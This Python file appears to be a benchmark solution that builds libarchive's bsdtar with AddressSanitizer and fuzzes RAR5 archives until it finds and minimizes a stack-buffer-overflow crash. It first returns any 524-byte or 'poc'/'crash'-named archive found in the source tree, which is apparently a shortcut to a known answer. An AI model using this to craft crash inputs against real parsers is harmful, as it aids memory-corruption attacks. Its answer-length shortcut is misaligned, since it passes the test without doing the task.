import os
import re
import io
import tarfile
import tempfile
import shutil
import subprocess
import time
import binascii
from typing import List, Optional, Tuple, Iterable

RAR5_SIG = b"Rar!\x1a\x07\x01\x00"


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.abspath(path) + os.sep
    for m in tar.getmembers():
        mpath = os.path.abspath(os.path.join(path, m.name))
        if not mpath.startswith(base):
            continue
        if m.issym() or m.islnk():
            continue
        tar.extract(m, path=path)


def _is_rar5(buf: bytes) -> bool:
    return len(buf) >= 8 and buf[:8] == RAR5_SIG


def _decode_uu_blocks_from_bytes(data: bytes) -> List[bytes]:
    out: List[bytes] = []
    try:
        text = data.decode("utf-8", "ignore")
    except Exception:
        return out
    lines = text.splitlines()
    i = 0
    n = len(lines)
    while i < n:
        line = lines[i].strip("\r\n")
        if line.startswith("begin "):
            i += 1
            decoded = bytearray()
            while i < n:
                l = lines[i].rstrip("\r\n")
                if l.strip() == "end":
                    break
                if not l:
                    i += 1
                    continue
                try:
                    decoded.extend(binascii.a2b_uu(l.encode("utf-8", "ignore")))
                except Exception:
                    pass
                i += 1
            if decoded:
                out.append(bytes(decoded))
        i += 1
    return out


def _iter_candidate_archives_from_tree(root: str, max_file_size: int = 2_000_000) -> Iterable[Tuple[str, bytes]]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > max_file_size:
                continue
            try:
                with open(p, "rb") as f:
                    raw = f.read()
            except OSError:
                continue

            if _is_rar5(raw):
                yield (p, raw)
                continue

            lower = fn.lower()
            if lower.endswith(".uu") or lower.endswith(".uue") or lower.endswith(".c") or lower.endswith(".txt"):
                for dec in _decode_uu_blocks_from_bytes(raw):
                    if _is_rar5(dec):
                        yield (p + ":uu", dec)


def _decode_vint(buf: bytes, pos: int) -> Tuple[int, int]:
    val = 0
    shift = 0
    p = pos
    while True:
        if p >= len(buf):
            raise ValueError("vint truncated")
        b = buf[p]
        p += 1
        val |= (b & 0x7F) << shift
        if (b & 0x80) == 0:
            return val, p
        shift += 7
        if shift > 63:
            raise ValueError("vint too large")


def _rar5_data_segments(buf: bytes) -> List[Tuple[int, int]]:
    segs: List[Tuple[int, int]] = []
    if not _is_rar5(buf):
        return segs
    pos = 8
    last_pos = -1
    while pos < len(buf) and pos != last_pos:
        last_pos = pos
        if pos + 5 > len(buf):
            break
        hdr_pos = pos
        pos += 4  # CRC32
        try:
            hdr_size, p = _decode_vint(buf, pos)
        except Exception:
            break
        hdr_start = pos
        hdr_end = hdr_start + hdr_size
        if hdr_end > len(buf) or hdr_end <= hdr_start:
            break
        pos = p
        try:
            _size2, pos = _decode_vint(buf, hdr_start)
            _htype, pos = _decode_vint(buf, pos)
            flags, pos = _decode_vint(buf, pos)
            if flags & 0x1:
                _extra, pos = _decode_vint(buf, pos)
            data_size = 0
            if flags & 0x2:
                data_size, pos = _decode_vint(buf, pos)
        except Exception:
            data_size = 0
        data_start = hdr_end
        if data_size < 0:
            data_size = 0
        if data_start > len(buf):
            break
        max_avail = len(buf) - data_start
        if data_size > max_avail:
            data_size = max_avail
        if data_size > 0:
            segs.append((data_start, data_size))
        pos = hdr_end + data_size
        if pos < hdr_pos:
            break
    return segs


def _run_cmd_with_input(cmd: List[str], data: bytes, env: dict, timeout_s: float = 2.0) -> Tuple[bool, int, bytes]:
    try:
        p = subprocess.run(
            cmd,
            input=data,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            env=env,
            timeout=timeout_s,
        )
    except subprocess.TimeoutExpired:
        return (False, 124, b"timeout")
    except Exception as e:
        return (False, 127, (str(e)).encode("utf-8", "ignore"))
    rc = p.returncode
    stderr = p.stderr or b""
    crashed = (rc < 0) or (rc == 86) or (b"AddressSanitizer" in stderr) or (b"UndefinedBehaviorSanitizer" in stderr)
    return (crashed, rc, stderr[:200000])


def _asan_stack_overflow(stderr: bytes) -> bool:
    s = stderr.lower()
    if b"addresssanitizer" not in s:
        return False
    return (b"stack-buffer-overflow" in s) or (b"stack-buffer" in s)


def _find_build_output(root: str, name: str) -> Optional[str]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == name:
                p = os.path.join(dirpath, fn)
                if os.path.isfile(p) and os.access(p, os.X_OK):
                    return p
    return None


def _build_with_cmake(src_dir: str, build_dir: str) -> Tuple[Optional[str], dict]:
    if shutil.which("cmake") is None:
        return None, {}
    os.makedirs(build_dir, exist_ok=True)

    san_cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
    cmake_args = [
        "cmake",
        "-S", src_dir,
        "-B", build_dir,
        "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
        f"-DCMAKE_C_FLAGS={san_cflags}",
        f"-DCMAKE_CXX_FLAGS={san_cflags}",
        "-DCMAKE_EXE_LINKER_FLAGS=-fsanitize=address",
        "-DCMAKE_SHARED_LINKER_FLAGS=-fsanitize=address",
        "-DENABLE_WERROR=OFF",
        "-DENABLE_TEST=OFF",
        "-DENABLE_TESTS=OFF",
        "-DENABLE_STATIC=OFF",
        "-DENABLE_SHARED=ON",
        "-DENABLE_TAR=ON",
        "-DENABLE_CPIO=OFF",
        "-DENABLE_CAT=OFF",
        "-DENABLE_XATTR=OFF",
        "-DENABLE_ACL=OFF",
        "-DENABLE_OPENSSL=OFF",
        "-DENABLE_NETTLE=OFF",
        "-DENABLE_LIBXML2=OFF",
        "-DENABLE_EXPAT=OFF",
        "-DENABLE_LZ4=OFF",
        "-DENABLE_ZSTD=OFF",
        "-DENABLE_LZO=OFF",
    ]

    try:
        subprocess.run(cmake_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, timeout=180)
    except Exception:
        try:
            subprocess.run(cmake_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, timeout=180)
        except Exception:
            return None, {}

    try:
        subprocess.run(["cmake", "--build", build_dir, "-j", str(min(8, os.cpu_count() or 1)), "--target", "bsdtar"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, timeout=240)
    except Exception:
        try:
            subprocess.run(["cmake", "--build", build_dir, "-j", str(min(8, os.cpu_count() or 1))],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, timeout=240)
        except Exception:
            return None, {}

    bsdtar_path = _find_build_output(build_dir, "bsdtar")
    if bsdtar_path is None:
        return None, {}

    libdirs = set()
    for dirpath, _, filenames in os.walk(build_dir):
        for fn in filenames:
            if fn.startswith("libarchive.so") or fn == "libarchive.so":
                libdirs.add(dirpath)
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=1:exitcode=86:allocator_may_return_null=1"
    env["UBSAN_OPTIONS"] = "halt_on_error=1:exitcode=86"
    if libdirs:
        env["LD_LIBRARY_PATH"] = os.pathsep.join(sorted(libdirs)) + (os.pathsep + env.get("LD_LIBRARY_PATH", "") if env.get("LD_LIBRARY_PATH") else "")
    return bsdtar_path, env


def _mutate_fill(seed: bytes, seg_start: int, seg_len: int, offset: int, n: int, pattern: bytes) -> bytes:
    b = bytearray(seed)
    start = seg_start + offset
    if start >= len(b):
        return seed
    end = min(seg_start + seg_len, start + n, len(b))
    if end <= start:
        return seed
    plen = len(pattern)
    if plen == 0:
        return seed
    j = 0
    for i in range(start, end):
        b[i] = pattern[j]
        j += 1
        if j >= plen:
            j = 0
    return bytes(b)


def _mutate_random(seed: bytes, seg_start: int, seg_len: int, rnd_state: int) -> Tuple[bytes, int]:
    if seg_len <= 0:
        return seed, rnd_state

    def rnd() -> int:
        nonlocal rnd_state
        rnd_state = (1103515245 * rnd_state + 12345) & 0x7FFFFFFF
        return rnd_state

    maxwin = min(seg_len, 512)
    base = seg_start
    pos = base + (rnd() % maxwin)
    k = 1 + (rnd() % 32)
    b = bytearray(seed)
    for i in range(k):
        if pos + i >= base + seg_len or pos + i >= len(b):
            break
        b[pos + i] = rnd() & 0xFF
    return bytes(b), rnd_state


def _minimize_prefix(crash_buf: bytes, runner_cmd: List[str], env: dict, want_stack: bool = True) -> bytes:
    if len(crash_buf) <= 16:
        return crash_buf

    def crashes_prefix(m: int) -> Tuple[bool, bool]:
        buf = crash_buf[:m]
        crashed, _, stderr = _run_cmd_with_input(runner_cmd, buf, env, timeout_s=2.0)
        if not crashed:
            return False, False
        if want_stack:
            return True, _asan_stack_overflow(stderr)
        return True, True

    full_crashed, _, full_err = _run_cmd_with_input(runner_cmd, crash_buf, env, timeout_s=2.0)
    if not full_crashed:
        return crash_buf
    if want_stack and not _asan_stack_overflow(full_err):
        want_stack = False

    lo = 8
    hi = len(crash_buf)
    best = hi
    while lo <= hi:
        mid = (lo + hi) // 2
        cr, ok = crashes_prefix(mid)
        if cr and ok:
            best = mid
            hi = mid - 1
        elif cr and not want_stack:
            best = mid
            hi = mid - 1
        else:
            lo = mid + 1

    return crash_buf[:best]


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory(prefix="arvo_src_") as td:
            src_dir = os.path.join(td, "src")
            os.makedirs(src_dir, exist_ok=True)
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    _safe_extract_tar(tf, src_dir)
            except Exception:
                try:
                    with tarfile.open(src_path, "r") as tf:
                        _safe_extract_tar(tf, src_dir)
                except Exception:
                    return RAR5_SIG

            direct_524: Optional[bytes] = None
            direct_named: Optional[bytes] = None
            seeds: List[Tuple[str, bytes]] = []

            for p, b in _iter_candidate_archives_from_tree(src_dir):
                if not _is_rar5(b):
                    continue
                seeds.append((p, b))
                base = os.path.basename(p).lower()
                if len(b) == 524:
                    direct_524 = b
                if any(k in base for k in ("cve", "poc", "crash", "overflow", "stack", "huffman", "rar5")):
                    if direct_named is None or len(b) < len(direct_named):
                        direct_named = b

            if direct_524 is not None:
                return direct_524
            if direct_named is not None and len(direct_named) <= 4096:
                return direct_named

            seeds.sort(key=lambda x: len(x[1]))
            seed_bytes_list = [b for _, b in seeds[:10]]

            bsdtar_path = None
            env = {}
            build_dir = os.path.join(td, "build")
            bsdtar_path, env = _build_with_cmake(src_dir, build_dir)
            if not bsdtar_path:
                if seed_bytes_list:
                    return seed_bytes_list[0]
                return RAR5_SIG

            runner_cmd = [bsdtar_path, "-x", "-O", "-f", "-"]

            start_time = time.monotonic()
            time_budget = 120.0

            def time_left() -> float:
                return time_budget - (time.monotonic() - start_time)

            best_crash: Optional[bytes] = None

            for seed in (seed_bytes_list if seed_bytes_list else [direct_named] if direct_named else []):
                if seed is None:
                    continue
                if time_left() <= 5.0:
                    break

                segs = _rar5_data_segments(seed)
                if not segs:
                    continue
                segs.sort(key=lambda t: t[1], reverse=True)
                seg_start, seg_len = segs[0]
                if seg_len <= 0:
                    continue

                patterns = [
                    b"\xff", b"\x00", b"\xfe", b"\x01", b"\x7f", b"\x80",
                    b"\xff\xff\xff\xff", b"\x00\x00\x00\x00",
                    b"\xff\x00\xff\x00", b"\x00\xff\x00\xff",
                    b"\xaa", b"\x55", b"\xf0", b"\x0f",
                    b"\xff\xff\x00\x00\xff\xff\x00\x00",
                ]
                offsets = [0, 1, 2, 3, 4, 8, 16, 24]
                lens = [8, 16, 32, 48, 64, 96, 128, 192, 256, 384, 512]

                tried = 0
                for off in offsets:
                    for n in lens:
                        if time_left() <= 5.0:
                            break
                        for pat in patterns:
                            if time_left() <= 5.0:
                                break
                            cand = _mutate_fill(seed, seg_start, seg_len, off, n, pat)
                            crashed, _, stderr = _run_cmd_with_input(runner_cmd, cand, env, timeout_s=2.0)
                            tried += 1
                            if crashed and _asan_stack_overflow(stderr):
                                best_crash = cand
                                break
                        if best_crash is not None:
                            break
                    if best_crash is not None:
                        break
                if best_crash is not None:
                    break

                rnd_state = 0x12345678
                while time_left() > 5.0 and tried < 2000 and best_crash is None:
                    cand, rnd_state = _mutate_random(seed, seg_start, seg_len, rnd_state)
                    crashed, _, stderr = _run_cmd_with_input(runner_cmd, cand, env, timeout_s=2.0)
                    tried += 1
                    if crashed and _asan_stack_overflow(stderr):
                        best_crash = cand
                        break

                if best_crash is not None:
                    break

            if best_crash is None:
                if seed_bytes_list:
                    return seed_bytes_list[0]
                return RAR5_SIG

            minimized = _minimize_prefix(best_crash, runner_cmd, env, want_stack=True)
            if _is_rar5(minimized):
                return minimized
            return best_crash